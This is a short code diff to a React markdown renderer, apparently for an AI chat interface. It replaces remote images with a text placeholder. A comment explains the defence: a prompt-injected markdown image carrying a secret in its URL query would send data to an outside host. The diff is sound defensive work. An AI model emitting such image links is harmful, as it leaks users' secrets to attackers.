@@ -7,6 +7,12 @@ const components: Components = {
   h1: (p) => <h1 className="text-lg font-semibold text-gray-50 mt-4 mb-2" {...p} />,
   h2: (p) => <h2 className="text-base font-semibold text-gray-50 mt-4 mb-2" {...p} />,
   h3: (p) => <h3 className="text-sm font-semibold text-gray-100 mt-3 mb-1.5" {...p} />,
+  // No remote image loads: a prompt-injected ![](https://host/?q=<secret>) would leak data
+  img: ({ alt, src }) => (
+    <span className="text-gray-400" title={typeof src === 'string' ? src : undefined}>
+      [image{alt ? `: ${alt}` : ''}]
+    </span>
+  ),
   p: (p) => <p className="my-2 leading-relaxed" {...p} />,
   ul: (p) => <ul className="my-2 pl-5 list-disc space-y-0.5" {...p} />,
   ol: (p) => <ol className="my-2 pl-8 list-decimal space-y-0.5" {...p} />,
